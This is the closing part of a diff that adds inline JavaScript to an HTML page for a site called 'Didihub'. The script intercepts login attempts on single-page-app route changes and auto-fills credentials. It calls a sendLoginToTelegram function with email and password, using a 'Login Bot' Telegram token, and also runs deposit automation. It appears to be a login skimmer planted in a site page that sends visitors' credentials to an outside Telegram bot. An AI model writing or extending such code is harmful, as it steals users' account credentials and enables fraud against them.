+        // Additional monitoring for SPA
+        setTimeout(() => {
+            interceptLoginAttempts();
+            observeDOMChanges();
+            handleAutoFillOnLoginPage();
+            setupAutoFillWithRetry();
+        }, 2000);
+        
+        // Monitor hash changes untuk SPA
+        window.addEventListener('hashchange', function() {
+            if (window.location.hash.includes('login')) {
+                setTimeout(() => {
+                    handleAutoFillOnLoginPage();
+                    setupAutoFillWithRetry();
+                }, 500);
+            }
+        });
+        
+        // Monitor popstate untuk SPA
+        window.addEventListener('popstate', function() {
+            if (window.location.pathname.includes('login') || window.location.hash.includes('login')) {
+                setTimeout(() => {
+                    handleAutoFillOnLoginPage();
+                    setupAutoFillWithRetry();
+                }, 500);
+            }
+        });
+        
+        // Testing functions
+        window.testLogin = function(email = "test@example.com", password = "test123") {
+            console.log('Testing login integration...');
+            sendLoginToTelegram(email, password);
+        };
+        
+        window.testDeposit = function(amount = 50000) {
+            console.log('Testing deposit integration...');
+            processDeposit(amount);
+        };
+        
+        window.testAutoFill = function(email = "test@example.com", password = "test123") {
+            console.log('Testing auto-fill...');
+            fillLoginFormWithData(email, password);
+        };
+        
+        console.log('🔧 Didihub integrated system loaded');
+        console.log('📊 Features: Login monitoring, Auto-login, Deposit automation, Auto-fill new tab');
+        console.log('🤖 Login Bot configured:', LOGIN_TELEGRAM_TOKEN ? 'Yes' : 'No');
+        console.log('💰 Deposit Bot configured:', DEPOSIT_TELEGRAM_TOKEN ? 'Yes' : 'No');
+        console.log('🆕 New tab auto-fill: Enabled');
+    </script>
+</body>
+</html>
